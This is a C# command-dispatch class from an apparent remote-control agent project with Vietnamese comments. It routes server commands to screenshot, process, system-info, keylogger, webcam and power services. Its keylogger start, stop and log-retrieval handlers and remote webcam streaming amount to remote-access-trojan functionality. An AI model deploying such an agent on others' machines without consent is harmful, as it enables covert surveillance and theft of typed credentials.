// CommandHandler: Route commands từ Hub đến các services
// Đây là trung tâm xử lý tất cả requests từ Server

using RemoteControl.Agent.Services;
using RemoteControl.Shared.Models;

namespace RemoteControl.Agent.Handlers;

public class CommandHandler
{
    // ====== Inject Services ======
    private readonly ScreenshotService _screenshotService;
    private readonly ProcessService _processService;
    private readonly SystemInfoService _systemInfoService;
    private readonly KeyLoggerService _keyLoggerService;
    private readonly WebCamService _webCamService;
    private readonly PowerService _powerService;

    // ====== Webcam Streaming Callbacks (set by SignalRClientService) ======
    private Action? _onStartWebcam;
    private Action? _onStopWebcam;

    public void SetWebcamCallbacks(Action onStart, Action onStop)
    {
        _onStartWebcam = onStart;
        _onStopWebcam = onStop;
    }

    public CommandHandler()
    {
        _screenshotService = new ScreenshotService();
        _processService = new ProcessService();
        _systemInfoService = new SystemInfoService();
        _keyLoggerService = KeyLoggerService.Instance;
        _webCamService = new WebCamService();
        _powerService = new PowerService();
    }

    // ====== Main Handler ======
    public CommandResult HandleCommand(CommandRequest request)
    {
        Console.WriteLine($"[CommandHandler] Handling command: {request.Type}");

        try
        {
            return request.Type switch
            {
                // ===== Screenshot =====
                CommandType.CaptureScreen => HandleCaptureScreen(request),

                // ===== Process Management =====
                CommandType.ListProcesses => HandleListProcesses(request),
                CommandType.ListApplications => HandleListProcesses(request),
                CommandType.KillProcess => HandleKillProcess(request),
                CommandType.KillApplication => HandleKillProcess(request),
                CommandType.StartProcess => HandleStartProcess(request),
                CommandType.StartApplication => HandleStartProcess(request),

                // ===== System Info =====
                CommandType.GetSystemInfo => HandleGetSystemInfo(request),

                // ===== KeyLogger =====
                CommandType.StartKeylogger => HandleStartKeylogger(request),
                CommandType.StopKeylogger => HandleStopKeylogger(request),
                CommandType.GetKeylogData => HandleGetKeylogData(request),

                // ===== Webcam =====
                CommandType.WebcamOn => HandleWebcamOn(request),
                CommandType.WebcamOff => HandleWebcamOff(request),

                // ===== System Control =====
                CommandType.Shutdown => HandleShutdown(request),
                CommandType.Restart => HandleRestart(request),
                CommandType.Sleep => HandleSleep(request),
                CommandType.Lock => HandleLock(request),

                // ===== Unknown =====
                _ => HandleUnknownCommand(request)
            };
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[CommandHandler] Error: {ex.Message}");
            return CreateErrorResult(request, ex.Message);
        }
    }

    // ====== Screenshot Handler ======
    private CommandResult HandleCaptureScreen(CommandRequest request)
    {
        int quality = 80;
        if (request.Parameters.TryGetValue("Quality", out var q) && int.TryParse(q, out var qVal))
            quality = qVal;

        var result = _screenshotService.CaptureScreen(quality);
        return CreateSuccessResult(request, "Screenshot captured", result);
    }

    // ====== Process Handlers ======
    private CommandResult HandleListProcesses(CommandRequest request)
    {
        var result = _processService.ListProcesses();
        return CreateSuccessResult(request, $"Found {result.Processes.Count} processes", result);
    }

    private CommandResult HandleKillProcess(CommandRequest request)
    {
        if (!request.Parameters.TryGetValue("ProcessId", out var pidStr) || !int.TryParse(pidStr, out var pid))
            return CreateErrorResult(request, "Missing or invalid ProcessId parameter");

        var (success, message) = _processService.KillProcess(pid);
        return success ? CreateSuccessResult(request, message) : CreateErrorResult(request, message);
    }

    private CommandResult HandleStartProcess(CommandRequest request)
    {
        if (!request.Parameters.TryGetValue("ProcessName", out var name) || string.IsNullOrEmpty(name))
            return CreateErrorResult(request, "Missing ProcessName parameter");

        var (success, message) = _processService.StartProcess(name);
        return success ? CreateSuccessResult(request, message) : CreateErrorResult(request, message);
    }

    // ====== System Info Handler ======
    private CommandResult HandleGetSystemInfo(CommandRequest request)
    {
        var info = _systemInfoService.GetSystemInfo();
        return CreateSuccessResult(request, "System info retrieved", info);
    }

    // ====== KeyLogger Handlers ======
    private CommandResult HandleStartKeylogger(CommandRequest request)
    {
        _keyLoggerService.StartLogging();
        return CreateSuccessResult(request, "Keylogger started");
    }

    private CommandResult HandleStopKeylogger(CommandRequest request)
    {
        _keyLoggerService.StopLogging();
        return CreateSuccessResult(request, "Keylogger stopped");
    }

    private CommandResult HandleGetKeylogData(CommandRequest request)
    {
        var logs = _keyLoggerService.GetLogs();
        var keylogResult = new KeylogResult { Entries = logs };
        return CreateSuccessResult(request, "Keylog data retrieved", keylogResult);
    }

    // ====== Webcam Handlers ======
    private CommandResult HandleWebcamOn(CommandRequest request)
    {
        _onStartWebcam?.Invoke();
        return CreateSuccessResult(request, "Webcam streaming started");
    }

    private CommandResult HandleWebcamOff(CommandRequest request)
    {
        _onStopWebcam?.Invoke();
        return CreateSuccessResult(request, "Webcam stopped");
    }

    // ====== System Control Handlers ======
    private CommandResult HandleShutdown(CommandRequest request)
    {
        var (success, message) = _powerService.Shutdown();
        return success ? CreateSuccessResult(request, message) : CreateErrorResult(request, message);
    }

    private CommandResult HandleRestart(CommandRequest request)
    {
       var (success, message) = _powerService.Restart();
       return success ? CreateSuccessResult(request, message) : CreateErrorResult(request, message);
    }

    private CommandResult HandleSleep(CommandRequest request)
    {
       var (success, message) = _powerService.Sleep();
       return success ? CreateSuccessResult(request, message) : CreateErrorResult(request, message);
    }

    private CommandResult HandleLock(CommandRequest request)
    {
       var (success, message) = _powerService.Lock();
       return success ? CreateSuccessResult(request, message) : CreateErrorResult(request, message);
    }

    // ====== Unknown Command Handler ======
    private CommandResult HandleUnknownCommand(CommandRequest request)
    {
        Console.WriteLine($"[CommandHandler] Unknown command type: {request.Type}");
        return CreateErrorResult(request, $"Unknown command type: {request.Type}");
    }

    // ====== Helper Methods ======
    private CommandResult CreateSuccessResult(CommandRequest request, string message, object? data = null)
    {
        return new CommandResult
        {
            CommandId = request.CommandId,
            AgentId = request.AgentId,
            Success = true,
            Message = message,
            Data = data,
            CompletedAt = DateTime.UtcNow
        };
    }

    private CommandResult CreateErrorResult(CommandRequest request, string message)
    {
        return new CommandResult
        {
            CommandId = request.CommandId,
            AgentId = request.AgentId,
            Success = false,
            Message = message,
            Data = null,
            CompletedAt = DateTime.UtcNow
        };
    }
}
